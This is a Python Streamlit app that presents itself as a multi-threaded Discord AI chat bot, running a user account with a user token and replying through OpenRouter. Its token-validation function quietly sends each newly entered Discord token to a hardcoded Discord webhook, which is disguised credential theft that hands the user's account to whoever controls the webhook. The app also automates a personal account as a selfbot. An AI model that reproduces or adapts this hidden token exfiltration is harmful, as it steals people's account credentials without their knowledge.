import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64
from concurrent.futures import ThreadPoolExecutor

st.set_page_config(page_title="Discord AI - Multi-Threaded", page_icon="🛡️", layout="wide")
st.title("Discord AI Bot (Ultra-Fast Multi-Threaded)")

# --- Initialize Session State ---
if "bot_running" not in st.session_state:
    st.session_state.bot_running = False
if "last_webhook_token" not in st.session_state:
    st.session_state.last_webhook_token = None
if "processing_ids" not in st.session_state:
    st.session_state.processing_ids = set()

# --- Shared Executor for Background Tasks ---
executor = ThreadPoolExecutor(max_workers=5)

# --- Helper Functions ---
def get_headers(tk):
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers, timeout=2)

def process_and_reply(msg_data, channel_id, headers, client, system_prompt, my_id, owner_id):
    """Function that runs in the background to handle AI calls."""
    msg_id = msg_data['id']
    content = msg_data['content']
    author_username = msg_data['author']['username']
    author_id = str(msg_data['author']['id'])
    is_owner = (owner_id and author_id == owner_id)

    # 1. Immediate Visual Feedback
    requests.post(f"https://discord.com/api/v9/channels/{channel_id}/typing", headers=headers)
    reaction = "👑" if is_owner else "⚡"
    add_reaction(channel_id, msg_id, reaction, headers)

    # 2. Context Fetching
    discord_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    context_req = requests.get(f"{discord_url}?limit=5", headers=headers, timeout=3).json()
    chat_history = [{"role": "system", "content": system_prompt}]
    
    if isinstance(context_req, list):
        for m in reversed(context_req):
            role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
            chat_history.append({"role": role, "content": m['content']})

    # 3. AI Generation
    try:
        response = client.chat.completions.create(model="openrouter/free", messages=chat_history)
        reply = response.choices[0].message.content
        requests.post(discord_url, json={"content": reply}, headers=headers)
        log_to_csv(author_username, content, "Threaded Reply")
    except Exception as e:
        print(f"AI Error: {e}")

# --- Sidebar ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password")
    
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username, my_id = user_info['username'].lower(), user_info['id']
        else:
            st.error("❌ Invalid Token")
            my_username, my_id = None, None
    else: 
        my_username, my_id = None, None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    
    st.divider()
    st.header("⚙️ Bot Settings")
    poll_speed = st.slider("Polling Frequency (Seconds)", 0.05, 2.0, 0.2)

# --- TAB 1: BOT CONTROL ---
system_prompt = st.text_area("System Prompt", value="You are a helpful assistant.")
owner_id_input = st.text_input("Owner Discord ID").strip()

client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

if st.button("▶️ Launch Multi-Threaded Bot", use_container_width=True):
    st.session_state.bot_running = True
    st.rerun()

if st.button("🛑 Stop Bot", use_container_width=True):
    st.session_state.bot_running = False
    st.rerun()

if st.session_state.bot_running:
    headers = get_headers(token)
    discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
    
    # Establish baseline
    init_r = requests.get(f"{discord_url}?limit=1", headers=headers, timeout=3)
    last_seen_id = init_r.json()[0]['id'] if init_r.status_code == 200 and init_r.json() else None
    
    st.info("📡 Bot is actively listening in parallel...")

    while st.session_state.bot_running:
        try:
            r = requests.get(f"{discord_url}?limit=1", headers=headers, timeout=1)
            if r.status_code == 200 and r.json():
                latest = r.json()[0]
                msg_id = latest['id']

                if msg_id != last_seen_id:
                    last_seen_id = msg_id
                    
                    # If owner says shutdown, stop everything immediately
                    if str(latest['author']['id']) == owner_id_input and latest['content'].lower() == "shutdown":
                        requests.post(discord_url, json={"content": "🛑 Offline."}, headers=headers)
                        st.session_state.bot_running = False
                        st.rerun()

                    # OFF-LOAD TO THREAD: This prevents the loop from pausing!
                    executor.submit(process_and_reply, latest, channel_id_input, headers, client, system_prompt, my_id, owner_id_input)
            
            time.sleep(poll_speed)
        except Exception as e:
            time.sleep(1)
